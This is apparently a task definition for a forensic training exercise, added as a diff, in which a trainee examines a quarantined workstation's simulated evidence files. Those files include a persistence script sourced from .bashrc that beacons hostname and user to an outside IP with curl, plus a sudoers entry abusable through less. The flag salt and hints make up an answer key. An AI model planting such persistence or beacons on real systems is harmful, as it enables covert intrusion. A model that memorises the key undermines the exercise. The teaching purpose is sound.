@@ -1,0 +1,39 @@
+{
+  "order": 1,
+  "title": "Triage the Compromised Workstation",
+  "description": "You are handed a shell on 10.0.1.87 — the workstation Tunde's team quarantined overnight. The memory dump is mounted at /evidence/mem/, the filesystem at /evidence/fs/, and the last 72h of shell history at /evidence/bash_history.\n\nYour brief:\n\n1. Locate the persistence mechanism The Griot left behind. It is not in /etc/cron.d/. It is not a systemd unit. It survives a reboot.\n\n2. Produce a hash of the first file the attacker executed after initial access. Submit it as the flag in the form TRAN{sha256...}.\n\n3. The persistence mechanism abuses a feature, not a bug. In your grader feedback, name the feature and the MITRE ATT&CK technique ID.\n\nConstraints: You may not run any command that writes to disk. Read-only forensic discipline — Tunde will check.",
+  "maxPoints": 40,
+  "kind": "FLAG",
+  "widget": "WEB_TERMINAL",
+  "widgetConfig": {
+    "prompt": "intern@forensic-workstation:/evidence$",
+    "welcome": [
+      "TRAN Forensic Analysis Environment — read-only",
+      "Host: 10.0.1.87 · Status: QUARANTINED 2024-01-15 04:12 UTC",
+      "Memory dump, filesystem and shell history mounted under /evidence/",
+      "",
+      "Type `ls /evidence` to begin. Type `help` for allowed commands."
+    ],
+    "files": {
+      "/evidence/README.md": "Compromised workstation 10.0.1.87 — Sankofa Digital FIN-ANALYSIS team.\nPrimary user: o.adegoke@sankofa.internal (on leave, unaware of compromise)\nFull disk + memory dump acquired 2024-01-15 04:12 UTC.\n\n/evidence/fs/        — filesystem mount (read-only)\n/evidence/mem/       — Volatility 3 output (pre-parsed)\n/evidence/bash_history — last 72h shell history from all users\n/evidence/auth.log   — /var/log/auth.log (last 7 days)\n\nNo standard persistence found in crontab or systemd. Go deeper.",
+      "/evidence/bash_history": "# o.adegoke — 2024-01-14\n09:02  ls\n09:04  vim quarterly-report.docx\n12:14  git pull origin main\n14:30  python manage.py runserver\n16:10  exit\n\n# root — 2024-01-14  (!!! o.adegoke does not have sudo)\n02:14  id\n02:14  uname -a\n02:15  ls /home\n02:16  cat ~o.adegoke/.bashrc\n02:17  echo 'source /var/lib/mc/.helper' >> ~o.adegoke/.bashrc\n02:17  chmod +x /var/lib/mc/.helper\n02:18  exit\n",
+      "/evidence/auth.log": "Jan 14 02:12:33 workstation sshd[4411]: Accepted publickey for o.adegoke from 185.220.101.9 port 49183\nJan 14 02:13:01 workstation sudo: o.adegoke : TTY=pts/3 ; PWD=/home/o.adegoke ; USER=root ; COMMAND=ALL\nJan 14 02:13:01 workstation sudo: pam_unix(sudo:session): session opened for user root by (uid=1004)\n\n! NOTE by forensic team: o.adegoke is NOT in /etc/sudoers. The granted sudo should not have happened.",
+      "/evidence/fs/etc/sudoers.d/90-ops": "# ops team — standard\n%ops ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx, /usr/bin/systemctl restart gunicorn\n\n# added 2024-01-13 by unknown — 'temporary diagnostic'\no.adegoke ALL=(ALL) NOPASSWD: /usr/bin/less /var/log/*\n",
+      "/evidence/fs/var/lib/mc/.helper": "#!/bin/bash\n# Griot — persistence v2\n# triggered on every new interactive shell via o.adegoke's .bashrc\nif [ -z \"$_GRIOT\" ]; then\n  export _GRIOT=1\n  (curl -sfm 10 https://185.220.101.9/beacon -d \"$(hostname):$(whoami)\" >/dev/null 2>&1 &) 2>/dev/null\nfi\n",
+      "/evidence/fs/home/o.adegoke/.bashrc": "# managed by sankofa-it — do not edit\nPS1='\\u@\\h:\\w\\$ '\nexport PATH=$HOME/.local/bin:$PATH\nsource /var/lib/mc/.helper\n",
+      "/evidence/mem/first-exec.log": "Volatility 3 · windows.pslist equivalent for Linux\n\nFirst processes spawned from SSH session pts/3 (The Griot):\n  02:13:08  /bin/bash\n  02:13:15  id\n  02:13:22  uname -a\n  02:13:40  /usr/bin/less /var/log/auth.log\n  02:14:02  /usr/bin/less /etc/sudoers.d/90-ops\n  02:14:50  /usr/bin/less /var/log/syslog\n  02:16:11  /bin/bash -c 'chmod +x /var/lib/mc/.helper'\n  02:16:14  curl -sfm 10 https://185.220.101.9/beacon -d 'workstation:root'\n\nFirst file executed by the attacker session after initial access:\n  /var/lib/mc/.helper (chmod +x applied 02:16:11)",
+      "/evidence/fs/var/lib/mc/.helper.sha256": {
+        "kind": "flag",
+        "salt": "stage-3-task-1-salt"
+      }
+    },
+    "hints": [
+      "The abused feature is in /etc/sudoers.d/. Think: what can `less` do?",
+      "The flag file is the sha256 of /var/lib/mc/.helper — presented to you once you locate it."
+    ]
+  },
+  "flagSalt": "stage-3-task-1-salt",
+  "choices": null,
+  "correctIndex": null,
+  "minWords": null
+}
